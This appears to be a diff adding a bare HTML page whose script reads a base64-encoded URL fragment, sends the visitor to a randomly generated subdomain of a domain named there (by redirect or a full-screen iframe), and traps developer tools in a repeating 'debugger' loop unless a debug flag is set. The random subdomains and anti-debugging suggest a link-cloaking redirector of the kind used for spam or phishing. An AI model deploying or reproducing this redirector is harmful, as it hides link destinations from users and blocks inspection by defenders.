@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  <title></title>
+  <style>
+    html,
+    body {
+      width: 100%;
+      height: 100%;
+      margin: 0;
+      padding: 0;
+    }
+
+    iframe {
+      width: 100%;
+      height: 100vh;
+      border: none;
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+    }
+  </style>
+</head>
+
+<body>
+  <script>
+    var debug = 0;
+    if (location.hash && location.hash.slice(1)) {
+      var base64 = location.hash.slice(1),
+        hash = window.atob(base64);
+      if (base64 && hash) {
+        var GET = {};
+        hash.split('&').forEach(function (item) { var arr = item.split('='); if (arr.length != 1) { GET[arr[0]] = decodeURIComponent(arr[1]) } else { GET[item] = '' } })
+        var domain3 = GET['domain3'], iframe = Number(GET['iframe']);
+        var uniqid = Date.now().toString(36)
+        var random = window.btoa(Date.now())
+        var url = `https://${uniqid}.${domain3}/?==${random}`;
+        if (iframe == '1') {
+          document.write(`<iframe src="${url}"></iframe>`)
+        } else {
+          location.href = url;
+        }
+        debug = Number(GET['debug']);
+      }
+    }
+    if (!debug) {
+      console.log('debug', debug)
+      setInterval(function () { debugger }, 100)
+    }
+  </script>
+</body>
+
+</html>
